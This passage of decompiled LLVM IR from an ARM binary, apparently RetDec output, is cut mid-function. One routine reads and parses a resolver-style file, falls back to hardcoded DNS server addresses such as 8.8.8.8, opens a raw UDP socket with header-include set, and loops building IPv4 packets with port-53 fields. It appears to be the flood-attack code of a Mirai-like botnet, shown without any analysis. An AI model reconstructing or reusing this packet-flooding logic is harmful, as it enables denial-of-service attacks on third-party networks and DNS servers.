  %v4_dc44 = inttoptr i32 %v3_dc44 to i8*
  store i8 %v1_dc44, i8* %v4_dc44, align 1
  %v0_dc48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc48, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4
  %v0_dc4c = call i32 @function_fe60()
  %v1_dc4c = trunc i32 %v0_dc4c to i8
  %v4_dc50 = sdiv i32 %v0_dc4c, 256
  store i32 %v4_dc50, i32* %r3.global-to-local, align 4
  %v1_dc54 = trunc i32 %v4_dc50 to i8
  %v2_dc54 = load i32, i32* @r6, align 4
  %v3_dc54 = add i32 %v2_dc54, 3
  %v4_dc54 = inttoptr i32 %v3_dc54 to i8*
  store i8 %v1_dc54, i8* %v4_dc54, align 1
  %v3_dc58 = load i32, i32* @r6, align 4
  %v4_dc58 = add i32 %v3_dc58, 2
  %v5_dc58 = inttoptr i32 %v4_dc58 to i8*
  store i8 %v1_dc4c, i8* %v5_dc58, align 1
  br label %dec_label_pc_daf0

dec_label_pc_dc60:                                ; preds = %dec_label_pc_d8c0
  %v0_dc60 = load i32, i32* %fp.global-to-local, align 4
  %v1_dc64 = call i32 @function_13654(i32 %v0_dc60)
  br label %dec_label_pc_dc68

dec_label_pc_dc68:                                ; preds = %dec_label_pc_d7b0, %dec_label_pc_dc60
  %v29_dc6c = phi i32 [ %v3_d8b0, %dec_label_pc_d7b0 ], [ %v1_dc64, %dec_label_pc_dc60 ]
  store i32 %v3_d7b0, i32* %r4.global-to-local, align 4
  store i32 %v12_d7b0, i32* %r7.global-to-local, align 4
  ret i32 %v29_dc6c

; uselistorder directives
  uselistorder i32 %v4_dc50, { 1, 0 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i32 %v0_dbc0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_dba0, { 1, 0 }
  uselistorder i32 %v1_db94, { 1, 2, 3, 0 }
  uselistorder i32 %v1_db90, { 2, 0, 3, 1 }
  uselistorder i32 %v3_db58, { 1, 0 }
  uselistorder i32 %v4_db04, { 1, 0 }
  uselistorder i1 %v3_dad0, { 1, 0 }
  uselistorder i32 %v1_da78, { 1, 0, 2, 3 }
  uselistorder i32 %v1_da1c, { 1, 0 }
  uselistorder i32 %v1_d9a4, { 1, 0 }
  uselistorder i32 %v1_d92c, { 1, 0 }
  uselistorder i32 %v1_d920, { 1, 0 }
  uselistorder i32 %v0_d8f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d8e8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d8e0, { 1, 0 }
  uselistorder i1 %v7_d8b4, { 1, 0 }
  uselistorder i32 %v3_d8b0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d850, { 1, 0 }
  uselistorder i8 %v5_d840, { 1, 0 }
  uselistorder i32 %v5_d824, { 1, 0 }
  uselistorder i32 %v6_d7e8, { 1, 0 }
  uselistorder i32 %v1_d7b4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 5, 2, 4, 3, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960), { 6, 7, 0, 8, 1, 9, 2, 3, 10, 11, 12, 4, 5 }
  uselistorder label %dec_label_pc_dc68, { 1, 0 }
  uselistorder label %dec_label_pc_daf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_da90, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_dc74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc74:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_dc74 = load i32, i32* @r4, align 4
  %v15_dc74 = load i32, i32* @r8, align 4
  %v18_dc74 = load i32, i32* @sb, align 4
  %v21_dc74 = load i32, i32* @sl, align 4
  %v24_dc74 = load i32, i32* @fp, align 4
  %v1_dc80 = urem i32 %arg1, 256
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_dc8c = urem i32 %arg3, 256
  store i32 %v1_dc8c, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_dc98 = call i32 @function_14254(i32 %v1_dc80, i32 4)
  %v0_dc9c = load i32, i32* @r5, align 4
  store i32 %v0_dc9c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_dca8 = load i32, i32* @r4, align 4
  store i32 %v0_dca8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_dcb0 = inttoptr i32 %v0_dc9c to i32*
  %v6_dcb0 = call i32 @function_a4e8(i32 %v0_dca8, i32* %v5_dcb0, i32 2, i32 0)
  %v1_dcbc = urem i32 %v6_dcb0, 256
  store i32 %v1_dcbc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_dcc8 = load i32, i32* @r4, align 4
  store i32 %v0_dcc8, i32* %r0.global-to-local, align 4
  %v0_dccc = load i32, i32* @r5, align 4
  store i32 %v0_dccc, i32* %r1.global-to-local, align 4
  %v5_dcd0 = trunc i32 %v6_dcb0 to i8
  %v6_dcd4 = inttoptr i32 %v0_dccc to i32*
  %v7_dcd4 = call i32 @function_a4e8(i32 %v0_dcc8, i32* %v6_dcd4, i32 3, i32 65535)
  %v0_dcd8 = load i32, i32* @r5, align 4
  store i32 %v0_dcd8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_dce4 = load i32, i32* @r4, align 4
  store i32 %v0_dce4, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_dcec = inttoptr i32 %v0_dcd8 to i32*
  %v6_dcec = call i32 @function_a4e8(i32 %v0_dce4, i32* %v5_dcec, i32 4, i32 64)
  %v1_dcf4 = urem i32 %v6_dcec, 256
  store i32 %v1_dcf4, i32* %ip.global-to-local, align 4
  %v0_dcf8 = load i32, i32* @r5, align 4
  store i32 %v0_dcf8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd04 = load i32, i32* @r4, align 4
  store i32 %v0_dd04, i32* %r0.global-to-local, align 4
  %v6_dd0c = inttoptr i32 %v0_dcf8 to i32*
  %v7_dd0c = call i32 @function_a4e8(i32 %v0_dd04, i32* %v6_dd0c, i32 5, i32 0)
  %v1_dd18 = urem i32 %v7_dd0c, 256
  store i32 %v1_dd18, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_dd24 = load i32, i32* @r4, align 4
  store i32 %v0_dd24, i32* %r0.global-to-local, align 4
  %v0_dd28 = load i32, i32* @r5, align 4
  store i32 %v0_dd28, i32* %r1.global-to-local, align 4
  %v5_dd30 = inttoptr i32 %v0_dd28 to i32*
  %v6_dd30 = call i32 @function_a4e8(i32 %v0_dd24, i32* %v5_dd30, i32 6, i32 65535)
  %v0_dd34 = load i32, i32* @r5, align 4
  store i32 %v0_dd34, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_dd30, i32* %fp.global-to-local, align 4
  %v0_dd44 = load i32, i32* @r4, align 4
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  %v4_dd48 = inttoptr i32 %v0_dd34 to i32*
  %v5_dd48 = call i32 @function_a4e8(i32 %v0_dd44, i32* %v4_dd48, i32 7, i32 53)
  %v0_dd50 = load i32, i32* @r5, align 4
  store i32 %v0_dd50, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_dd48, i32* %sb.global-to-local, align 4
  %v0_dd60 = load i32, i32* @r4, align 4
  store i32 %v0_dd60, i32* %r0.global-to-local, align 4
  %v4_dd64 = inttoptr i32 %v0_dd50 to i32*
  %v5_dd64 = call i32 @function_a4e8(i32 %v0_dd60, i32* %v4_dd64, i32 9, i32 65535)
  %v0_dd68 = load i32, i32* @r5, align 4
  store i32 %v0_dd68, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_dd64, i32* @sl, align 4
  %v0_dd78 = load i32, i32* @r4, align 4
  store i32 %v0_dd78, i32* %r0.global-to-local, align 4
  %v4_dd7c = inttoptr i32 %v0_dd68 to i32*
  %v5_dd7c = call i32 @function_a4e8(i32 %v0_dd78, i32* %v4_dd7c, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd88 = load i32, i32* @r5, align 4
  store i32 %v0_dd88, i32* %r1.global-to-local, align 4
  store i32 %v5_dd7c, i32* %r8.global-to-local, align 4
  %v0_dd90 = load i32, i32* @r4, align 4
  store i32 %v0_dd90, i32* %r0.global-to-local, align 4
  %v5_dd94 = inttoptr i32 %v0_dd88 to i32*
  %v6_dd94 = call i32 @function_9f84(i32 %v0_dd90, i32* %v5_dd94, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_dda0 = call i32 @function_1236c(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_ddac = call i32 @function_12288(i32 30, i32* null)
  store i32 %v3_ddac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ddb4 = inttoptr i32 %v3_ddac to i8*
  %v3_ddb4 = call i32 @function_13780(i8* %v2_ddb4, i32 0)
  store i32 %v3_ddb4, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_ddc0 = call i32 @function_122b4(i32 30)
  store i32 %v1_ddc0, i32* %r0.global-to-local, align 4
  %v0_ddc4 = load i32, i32* @r4, align 4
  %v1_ddc4 = icmp slt i32 %v0_ddc4, 0
  %v2_ddc4 = icmp eq i32 %v0_ddc4, 0
  store i1 %v2_ddc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_ddc4, label %dec_label_pc_e390, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dc74
  %v2_ddd0 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_ddd0, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r1.global-to-local, align 4
  store i32 %v0_ddc4, i32* %r0.global-to-local, align 4
  %v4_dde0 = call i32 @function_1381c(i32 %v0_ddc4, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_dde0, i32* @r5, align 4
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @function_13654(i32 %v0_dde8)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_ddf4 = call i32 @function_1236c(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_de00 = call i32 @function_12288(i32 31, i32* null)
  %v0_de04 = load i32, i32* @r5, align 4
  store i32 %v0_de04, i32* @r1, align 4
  store i32 %v3_de00, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r0.global-to-local, align 4
  %v3_de10 = bitcast i32* %stack_var_-2120 to i8*
  %v4_de10 = call i32 @function_12fe8(i8* %v3_de10, i32 %v0_de04, i32 %v3_de00)
  store i32 %v4_de10, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_de1c = call i32 @function_122b4(i32 31)
  store i32 %v1_de1c, i32* %r0.global-to-local, align 4
  %v0_de20 = load i32, i32* @r4, align 4
  %v7_de20 = icmp eq i32 %v0_de20, -1
  store i1 %v7_de20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de20, label %dec_label_pc_e390, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_ddcc
  %v0_de28 = load i32, i32* @r5, align 4
  %v9_de28 = icmp eq i32 %v0_de28, %v0_de20
  store i1 %v9_de28, i1* %cpsr_z.global-to-local, align 1
  %v7_de2c = icmp sgt i32 %v0_de28, %v0_de20
  br i1 %v7_de2c, label %dec_label_pc_de30, label %dec_label_pc_e390

dec_label_pc_de30:                                ; preds = %dec_label_pc_de28
  store i32 %v0_de28, i32* %r3.global-to-local, align 4
  store i32 %v0_de20, i32* %r2.global-to-local, align 4
  %v0_de40 = load i32, i32* @r6, align 4
  %v2_de40 = add i32 %v0_de40, %v0_de20
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_de48 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_de48, i32* @r7, align 4
  %v1_de78 = add i32 %v0_de28, -1
  br label %dec_label_pc_de70

dec_label_pc_de54:                                ; preds = %dec_label_pc_de98, %bb138
  %v9_de54 = icmp eq i32 %v0_de60, %v1_de78
  store i1 %v9_de54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_de54, label %dec_label_pc_dea4, label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de88, %dec_label_pc_de54, %bb
  %v0_de9442 = phi i32 [ %v0_de94, %dec_label_pc_de88 ], [ %v0_de9443, %dec_label_pc_de54 ], [ %v0_de94, %bb ]
  %v0_de7438 = phi i32 [ 0, %dec_label_pc_de88 ], [ %v0_de7439, %dec_label_pc_de54 ], [ 0, %bb ]
  store i32 %v0_de28, i32* %r0.global-to-local, align 4
  %v1_de60 = add i32 %v0_de60, 1
  store i32 %v1_de60, i32* %r2.global-to-local, align 4
  %v9_de64 = icmp eq i32 %v0_de28, %v1_de60
  store i1 %v9_de64, i1* %cpsr_z.global-to-local, align 1
  %v1_de68 = add i32 %v0_de68, 1
  store i32 %v1_de68, i32* @r7, align 4
  br i1 %v9_de64, label %dec_label_pc_e390, label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de30
  %v0_de68 = phi i32 [ %v1_de68, %dec_label_pc_de5c ], [ %v2_de48, %dec_label_pc_de30 ]
  %v0_de60 = phi i32 [ %v1_de60, %dec_label_pc_de5c ], [ %v0_de20, %dec_label_pc_de30 ]
  %v0_de94 = phi i32 [ %v0_de9442, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de74 = phi i32 [ %v0_de7438, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de7c = phi i32 [ %v1_de7c, %dec_label_pc_de5c ], [ %v2_de40, %dec_label_pc_de30 ]
  %v1_de70 = inttoptr i32 %v0_de7c to i8*
  %v2_de70 = load i8, i8* %v1_de70, align 1
  %v3_de70 = zext i8 %v2_de70 to i32
  store i32 %v3_de70, i32* %r3.global-to-local, align 4
  %v2_de74 = icmp eq i32 %v0_de74, 0
  store i1 %v2_de74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_de78, i32* %ip.global-to-local, align 4
  %v1_de7c = add i32 %v0_de7c, 1
  store i32 %v1_de7c, i32* %r1.global-to-local, align 4
  %v1_de80 = add nsw i32 %v3_de70, -48
  store i32 %v1_de80, i32* %r0.global-to-local, align 4
  br i1 %v2_de74, label %dec_label_pc_de88, label %dec_label_pc_de98

dec_label_pc_de88:                                ; preds = %dec_label_pc_de70
  %v7_de88 = icmp eq i8 %v2_de70, 9
  store i1 %v7_de88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de88, label %dec_label_pc_de5c, label %bb

bb:                                               ; preds = %dec_label_pc_de88
  %v8_de8c = icmp eq i8 %v2_de70, 32
  store i1 %v8_de8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_de8c, label %dec_label_pc_de5c, label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %bb
  %v1_de94 = add i32 %v0_de94, 1
  store i32 %v1_de94, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de94
  %v0_de9443 = phi i32 [ %v0_de94, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v0_de7439 = phi i32 [ %v0_de74, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v7_de98 = icmp eq i8 %v2_de70, 46
  store i1 %v7_de98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de98, label %dec_label_pc_de54, label %bb138

bb138:                                            ; preds = %dec_label_pc_de98
  %v8_de9c = icmp eq i32 %v1_de80, 9
  store i1 %v8_de9c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_de80, 10
  br i1 %tmp, label %dec_label_pc_de54, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de54, %bb138
  %v0_de60.lcssa = phi i32 [ %v1_de78, %dec_label_pc_de54 ], [ %v0_de60, %bb138 ]
  %v2_dea8 = sub i32 %v0_de60.lcssa, %v0_de20
  store i32 %v2_dea8, i32* %r2.global-to-local, align 4
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 %v2_de48, i32* %r0.global-to-local, align 4
  %v3_deb4 = call i32 @function_12d10(i32 %v2_de48, i32 %v2_de40, i32 %v2_dea8)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_de48, i32* @r0, align 4
  %v2_dec4 = load i32, i32* @r7, align 4
  %v3_dec4 = inttoptr i32 %v2_dec4 to i8*
  store i8 0, i8* %v3_dec4, align 1
  %v1_dec8 = call i32 @function_13d30(i32 %v2_de48)
  store i32 %v1_dec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_ded020:                              ; preds = %dec_label_pc_e390
  unreachable

dec_label_pc_ded0:                                ; preds = %dec_label_pc_e408, %dec_label_pc_e3f8, %dec_label_pc_e3ec, %dec_label_pc_e3d8, %dec_label_pc_dea4
  %v29_e3d474 = phi i32 [ %v1_e394, %dec_label_pc_e408 ], [ %v1_e394, %dec_label_pc_e3f8 ], [ %v1_e394, %dec_label_pc_e3ec ], [ %v1_e394, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_e408 ], [ 104859200, %dec_label_pc_e3f8 ], [ 707416650, %dec_label_pc_e3ec ], [ 134744072, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_ded4 = icmp eq i32 %v6_dd94, 0
  store i1 %v2_ded4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ded4, label %dec_label_pc_e3cc, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %dec_label_pc_ded0
  store i32 %v6_dd94, i32* %r0.global-to-local, align 4
  %v1_dee0 = inttoptr i32 %v6_dd94 to i8*
  %v2_dee0 = call i32 @function_12c94(i8* %v1_dee0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_def4 = call i32 @function_13f50(i32 2, i32 3, i32 17)
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v7_def8 = icmp eq i32 %v3_def4, -1
  store i1 %v7_def8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_def8, label %dec_label_pc_e3cc, label %dec_label_pc_df04

dec_label_pc_df04:                                ; preds = %dec_label_pc_dedc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_df10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_df10, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_df24 = call i32 @function_13f20(i32 %v3_def4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_df24, i32* %r0.global-to-local, align 4
  %v7_df28 = icmp eq i32 %v6_df24, -1
  store i1 %v7_df28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df28, label %dec_label_pc_e3c4, label %dec_label_pc_df30

dec_label_pc_df30:                                ; preds = %dec_label_pc_df04
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  %v3_df38 = mul i32 %v7_dcd4, 65536
  store i32 %v3_df38, i32* %lr.global-to-local, align 4
  %v0_df3c = load i32, i32* @sl, align 4
  %v3_df3c = mul i32 %v0_df3c, 65536
  store i32 %v3_df3c, i32* %sl.global-to-local, align 4
  %v0_df40 = load i32, i32* %r8.global-to-local, align 4
  %v0_df44 = load i32, i32* %fp.global-to-local, align 4
  %v0_df48 = load i32, i32* %sb.global-to-local, align 4
  %v3_df48 = mul i32 %v0_df48, 65536
  store i32 %v3_df48, i32* %sb.global-to-local, align 4
  %v5_df4c = trunc i32 %v0_df40 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_df54 = urem i32 %v7_dcd4, 65536
  store i32 %v3_df54, i32* %r2.global-to-local, align 4
  %v3_df58 = urem i32 %v0_df44, 65536
  store i32 %v3_df58, i32* %r3.global-to-local, align 4
  %v3_df5c = urem i32 %v0_df48, 65536
  store i32 %v3_df5c, i32* %r4.global-to-local, align 4
  %v3_df60 = urem i32 %v0_df3c, 65536
  store i32 %v3_df60, i32* %r8.global-to-local, align 4
  %v2_df64 = icmp eq i32 %v1_dc80, 0
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_df64, label %dec_label_pc_e3b4, label %dec_label_pc_df88

dec_label_pc_df88:                                ; preds = %dec_label_pc_df30
  %v4_df8c = sext i8 %v5_df4c to i32
  %v2_df90 = add i32 %v4_df8c, %v2_dee0
  store i32 %v2_df90, i32* @fp, align 4
  %v3_df94 = mul i32 %v2_df90, 65536
  %v1_df98 = add i32 %v3_df94, 1769472
  store i32 %v1_df98, i32* @r6, align 4
  %v1_df9c = add i32 %v3_df94, 3080192
  %v1_dfb0 = urem i32 %v0_df3c, 256
  %v3_dfc0 = udiv i32 %v1_df98, 256
  %v1_dfc4 = urem i32 %v7_dcd4, 256
  %v1_dfc8 = and i32 %v3_dfc0, 65280
  %v1_dfcc = urem i32 %v0_df48, 256
  %v3_dfd0 = mul nuw nsw i32 %v1_dfb0, 256
  %v1_dfd8 = urem i32 %v0_df44, 256
  %v3_dfdc = mul nuw nsw i32 %v1_dfcc, 256
  %tmp139 = udiv i32 %v0_df3c, 256
  %v4_dfe0 = urem i32 %tmp139, 256
  %v5_dfe0 = or i32 %v4_dfe0, %v3_dfd0
  store i32 %v5_dfe0, i32* %r8.global-to-local, align 4
  %v4_dfe4 = udiv i32 %v1_df98, 16777216
  %v5_dfe4 = or i32 %v1_dfc8, %v4_dfe4
  store i32 %v5_dfe4, i32* %sl.global-to-local, align 4
  %tmp140 = udiv i32 %v0_df44, 256
  %v3_dff0 = urem i32 %tmp140, 256
  %v4_dff4 = sdiv i32 %v1_df9c, 16777216
  %tmp141 = udiv i32 %v7_dcd4, 256
  %v4_dffc = mul nuw nsw i32 %v1_dfd8, 256
  %v5_dffc = or i32 %v4_dffc, %v3_dff0
  store i32 %v5_dffc, i32* @r5, align 4
  %tmp142 = udiv i32 %v0_df48, 256
  %v4_e000 = urem i32 %tmp142, 256
  %v5_e000 = or i32 %v4_e000, %v3_dfdc
  store i32 %v5_e000, i32* %sb.global-to-local, align 4
  store i32 %v1_dfc4, i32* %r0.global-to-local, align 4
  %v1_e00c = add i32 %v2_dee0, 1
  store i32 %v1_e00c, i32* @r7, align 4
  %v3_e010 = ashr i32 %v1_df9c, 31
  store i32 %v3_e010, i32* @lr, align 4
  store i32 %v1_dfd8, i32* %r1.global-to-local, align 4
  store i32 %v1_dfcc, i32* %r2.global-to-local, align 4
  %v3_e01c75 = udiv i32 %v1_dfc8, 256
  store i32 %v3_e01c75, i32* %r3.global-to-local, align 4
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e080 = sext i8 %v5_dcd0 to i32
  %sext13 = mul i32 %v6_dcec, 16777216
  %v4_e098 = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %tmp141, 16777216
  %v4_e0ac = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_dcd4, 16777216
  %v4_e0b0 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_df98, 256
  %v4_e0e0 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_df48, 16777216
  %v4_e0e4 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_df44, 16777216
  %v4_e108 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_df3c, 16777216
  %v4_e114 = sdiv i32 %sext19, 16777216
  %v1_e090 = trunc i32 %v4_dff4 to i8
  %extract.t = trunc i32 %v3_e010 to i8
  br label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_df88
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_e048 = call i32 @function_14254(i32 600, i32 1)
  store i32 %v2_e048, i32* %r0.global-to-local, align 4
  store i32 %v2_dc98, i32* %lr.global-to-local, align 4
  %v3_e050 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e050, i32* %r3.global-to-local, align 4
  %v2_e054 = load i32, i32* @r4, align 4
  %v5_e054 = mul i32 %v2_e054, 4
  %v6_e054 = add i32 %v5_e054, %v2_dc98
  %v7_e054 = inttoptr i32 %v6_e054 to i32*
  store i32 %v2_e048, i32* %v7_e054, align 4
  %v0_e058 = load i32, i32* %lr.global-to-local, align 4
  %v1_e058 = load i32, i32* %r3.global-to-local, align 4
  %v4_e058 = mul i32 %v1_e058, 4
  %v5_e058 = add i32 %v4_e058, %v0_e058
  %v6_e058 = inttoptr i32 %v5_e058 to i32*
  %v7_e058 = load i32, i32* %v6_e058, align 4
  store i32 %v7_e058, i32* %r1.global-to-local, align 4
  %v1_e05c = inttoptr i32 %v7_e058 to i8*
  %v2_e05c = load i8, i8* %v1_e05c, align 1
  %tmp154 = urem i8 %v2_e05c, 16
  %v1_e060 = zext i8 %tmp154 to i32
  %v1_e064 = or i32 %v1_e060, 64
  store i32 %v1_e064, i32* %r2.global-to-local, align 4
  %v1_e068 = trunc i32 %v1_e064 to i8
  store i8 %v1_e068, i8* %v1_e05c, align 1
  %v0_e06c = load i32, i32* %r1.global-to-local, align 4
  %v1_e06c = inttoptr i32 %v0_e06c to i8*
  %v2_e06c = load i8, i8* %v1_e06c, align 1
  %v1_e070 = and i8 %v2_e06c, -16
  %v1_e074 = or i8 %v1_e070, 5
  store i32 %v1_dd18, i32* %r0.global-to-local, align 4
  store i8 %v1_e074, i8* %v1_e06c, align 1
  store i32 %v4_e080, i32* %r2.global-to-local, align 4
  %v2_e084 = load i32, i32* %r1.global-to-local, align 4
  %v3_e084 = add i32 %v2_e084, 1
  %v4_e084 = inttoptr i32 %v3_e084 to i8*
  store i8 %v5_dcd0, i8* %v4_e084, align 1
  store i32 %v4_dff4, i32* %r3.global-to-local, align 4
  %v0_e08c = load i32, i32* %r0.global-to-local, align 4
  %v2_e08c = icmp eq i32 %v0_e08c, 0
  store i1 %v2_e08c, i1* %cpsr_z.global-to-local, align 1
  %v2_e090 = load i32, i32* %r1.global-to-local, align 4
  %v3_e090 = add i32 %v2_e090, 2
  %v4_e090 = inttoptr i32 %v3_e090 to i8*
  store i8 %v1_e090, i8* %v4_e090, align 1
